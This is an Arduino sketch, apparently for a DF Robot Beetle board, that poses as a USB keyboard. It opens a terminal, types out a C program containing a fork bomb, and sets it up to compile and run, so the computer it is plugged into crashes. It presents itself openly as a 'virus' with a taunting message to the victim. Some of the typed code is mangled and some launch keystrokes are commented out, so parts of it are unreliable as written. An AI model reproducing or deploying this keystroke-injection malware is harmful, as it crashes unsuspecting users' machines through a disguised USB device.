/*
 * DF Robot beetle Virus
 * 
 * This sketch acts as a keyboard and initiates a fork bomb
 * style "virus" causing the connected computer to crash
 * 
 */

#include <Keyboard.h>

void setup() {
  pinMode(13, OUTPUT);
  
  // setup keyboard library
  Keyboard.begin();
  delay(1000);

  // open a terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(1000);

  // create c virus file
  Keyboard.print("nano bomb.c");
  Keyboard.write(KEY_RETURN);
  delay(100);

  // enter contents of file
  Keyboard.print("\\include <unistd.h>\n\\include <stdio.h>\n\nint main(void)\n{");
  Keyboard.print("\tprintf(@# \bnHello!!@);\n\tsleep(2);\n\t");
  Keyboard.print("printf(@\n\nYou probably shouldnt have plugged that in...@);");
  Keyboard.print("\n\tsleep(2);\n\tsystem(@x-terminal-emulator -e cmatrix &@);");
  Keyboard.print("\n\tsleep(2);\n\tprintf(@\n\nrunning virus...\n\n@);\n\twhile(1) fork();\n}");


  // save and close
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('x');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.write('y');
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(100);

  // build file
  //Keyboard.print("make bomb");
  Keyboard.write(KEY_RETURN);

  //run file
  Keyboard.print("./bomb");
  //Keyboard.write(KEY_RETURN);

  Keyboard.end();  
}



void loop() {
  // flash for victory!!
  digitalWrite(13, LOW);
  delay(500);
  digitalWrite(13, HIGH);
  delay(500);
}
